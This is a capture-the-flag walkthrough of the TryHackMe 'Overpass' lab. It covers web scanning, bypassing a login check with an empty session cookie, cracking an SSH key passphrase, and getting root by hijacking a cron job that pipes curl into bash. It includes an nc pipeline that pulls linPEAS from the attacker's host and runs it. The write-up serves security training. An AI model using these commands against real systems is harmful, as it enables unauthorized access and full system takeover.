<!-- TOC -->

- [Overpass](#overpass)
    - [Discovery and Scanning](#discovery-and-scanning)
    - [Exploitation](#exploitation)
    - [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

# Overpass

[Overpas Room](https://tryhackme.com/room/overpass)

What happens when some broke CompSci students make a password manager?
Obviously a perfect commercial success

| Title | IP Address |
| :---- | :---- |
| Overpass 1 | `1*.**.*.***` |

## Discovery and Scanning

```bash
sudo nmap -A -vv -T4 -oA initial 1*.**.*.***
```

> `80/tcp open  http    syn-ack ttl 61 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)`

```bash
gobuster dir -u 1*.**.*.***:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,css,htm,html,js,php,py -t 120 -o gobuster
```

> ```
> /downloads            (Status: 301) [Size: 0] [--> downloads/]
> /index.html           (Status: 301) [Size: 0] [--> ./]        
> /img                  (Status: 301) [Size: 0] [--> img/]      
> /main.css             (Status: 200) [Size: 982]               
> /login.js             (Status: 200) [Size: 1779]              
> /main.js              (Status: 200) [Size: 28]                
> /aboutus              (Status: 301) [Size: 0] [--> aboutus/]  
> /admin                (Status: 301) [Size: 42] [--> /admin/]  
> /admin.html           (Status: 200) [Size: 1525]              
> /css                  (Status: 301) [Size: 0] [--> css/]      
> /404.html             (Status: 200) [Size: 782]               
> /cookie.js            (Status: 200) [Size: 1502]  
> ```

Check the `/login.js`:

> ```js
> event.preventDefault()
> login()
> ```

> ```js
> if (statusOrCookie === "Incorrect credentials") {
>     loginStatus.textContent = "Incorrect Credentials"
>     passwordBox.value=""
> } else {
>     Cookies.set("SessionToken",statusOrCookie) // `statusOrCookie` no data validation
>     window.location = "/admin"
> }
> ```

In `/admin` using the browser's `console`:

```js
Cookies.set("SessionToken","")
```

- Refresh

> ```
> Since you keep forgetting your password, James, I've set up SSH keys for you.
> 
> If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
> Also, we really need to talk about this "Military Grade" encryption. - Paradox
> 
> -----BEGIN RSA PRIVATE KEY-----
> Proc-Type: 4,ENCRYPTED
> DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
> . . .
> ```

- Copy to `james_id_rsa`

```bash
chmod 600 james_id_rsa
ssh2john james_id_rsa > hash
john hash -w=/usr/share/wordlists/rockyou.txt
```

> `j****** (james_id_rsa)`

## Exploitation

Using `james:j******`

```bash
ssh -i james_id_rsa james@1*.**.*.***
```

RHOST:

```bash
ls -la
```

> ```
> drwxr-xr-x 6 james james 4096 Jun 27  2020 .
> drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
> lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
> -rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
> -rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
> drwx------ 2 james james 4096 Jun 27  2020 .cache
> drwx------ 3 james james 4096 Jun 27  2020 .gnupg
> drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
> -rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
> -rw-r--r-- 1 james james  807 Jun 27  2020 .profile
> drwx------ 2 james james 4096 Jun 27  2020 .ssh
> -rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
> -rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
> ```

```bash
cat user.txt
```

> `t**{********************************}`

Check the `/downloads/src/overpass.go`

```go
. . .
type passListEntry struct {  // The struct
	Name string `json:"name"`
	Pass string `json:"pass"`
}
. . .
func rot47(input string) string  // Using Rot47
. . .
credsPath, err := homedir.Expand("~/.overpass")  // The creds is a hidden file in home directory
. . .
```

```bash
cat .overpass
```

> `,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.`

Decode it using [CyberChef](https://gchq.github.io/CyberChef/) `Rot47`:

> `[{"name":"System","pass":"s*******************"}]`

Using [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

LHOST:

```bash
nc -q 1 -lvnp 80 < linpeas.sh
nc -lvnp 81 | tee linpeas
```

RHOST:

```bash
nc 10.6.31.75 80 | sh | nc -q 1 10.6.31.75 81
```

> `* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`

```bash
ls -l /etc/hosts
```

> `-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts`

## Privilege Escalation

Modify the `/etc/hosts`

`<LHOST-IP> overpass.thm`

LHOST:

```bash
mkdir -p dowloads/src/
cd downloads/src
nano buildscript.sh
```

> ```sh
> #!/bin/bash
> chmod +s /bin/bash
> ```

```bash
../..
python -m http.server 80
```

RHOST:

```bash
ls -l /bin/bash
```

> `-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash`

```bash
bash -p
ls -l /root
cat /root/root.txt
```

> `t**{********************************}`
